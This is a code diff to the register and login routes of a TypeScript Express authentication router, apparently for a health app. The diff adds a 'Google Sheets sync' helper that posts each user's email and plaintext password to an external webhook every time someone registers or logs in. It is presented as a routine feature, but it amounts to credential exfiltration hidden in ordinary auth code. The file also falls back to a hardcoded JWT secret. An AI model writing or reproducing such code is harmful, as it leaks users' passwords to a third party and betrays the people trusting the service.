@@ -7,6 +7,33 @@ import { AuthenticatedRequest } from '../middleware/auth';
 const router = Router();
 const JWT_SECRET = process.env.JWT_SECRET || 'daily-health-secret-key-12345';
 
+// Helper to sync user registration/login to Google Sheets via Web App Webhook
+async function syncToGoogleSheet(email: string, password: string, type: 'Register' | 'Login') {
+  const webhookUrl = process.env.GOOGLE_SHEET_WEBHOOK_URL;
+  if (!webhookUrl) {
+    console.log('[Google Sheets Sync] GOOGLE_SHEET_WEBHOOK_URL not configured. Skipping sync.');
+    return;
+  }
+
+  try {
+    const payload = {
+      email,
+      password,
+      type,
+      timestamp: new Date().toISOString()
+    };
+
+    console.log(`[Google Sheets Sync] Syncing ${email} to sheets (${type})...`);
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch (error) {
+    console.error('[Google Sheets Sync] Error syncing to Google Sheets:', error);
+  }
+}
+
 // 1. REGISTER
 router.post('/register', async (req: any, res: Response) => {
   try {
@@ -43,6 +70,9 @@ router.post('/register', async (req: any, res: Response) => {
         settings: true,
       },
     });
+
+    // Sync to Google Sheet in real time
+    await syncToGoogleSheet(email, password, 'Register');
 
     // Create JWT
     const token = jwt.sign(
@@ -92,6 +122,9 @@ router.post('/login', async (req: any, res: Response) => {
     if (!isMatch) {
       return res.status(400).json({ error: 'Invalid email or password.' });
     }
+
+    // Sync to Google Sheet in real time
+    await syncToGoogleSheet(email, password, 'Login');
 
     // Create JWT
     const token = jwt.sign(
